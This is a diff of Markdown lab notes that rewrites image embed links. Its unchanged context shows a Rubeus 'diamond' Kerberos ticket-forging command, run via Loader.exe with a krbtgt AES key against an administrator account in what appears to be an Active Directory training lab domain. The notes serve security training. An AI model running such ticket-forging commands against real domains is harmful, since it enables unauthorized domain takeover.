@@ -1,4 +1,4 @@
-![[../../../attchments/Pasted image 20250619213728.png]]
+![Pasted image 20250619213728](../../../attchments/Pasted%20image%2020250619213728.png)
 
 ```
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdele
@@ -6,7 +6,7 @@ g/enctype:aes/ticketuser:administrator/domain:dollarcorp.moneycorp.local/dc:dcor
 indows\System32\cmd.exe/show/ptt
 ```
 
-![[../../../attchments/Pasted image 20250619213916.png]]
+![Pasted image 20250619213916](../../../attchments/Pasted%20image%2020250619213916.png)
 
-![[../../../attchments/Pasted image 20250619213956.png]]
+![Pasted image 20250619213956](../../../attchments/Pasted%20image%2020250619213956.png)
 
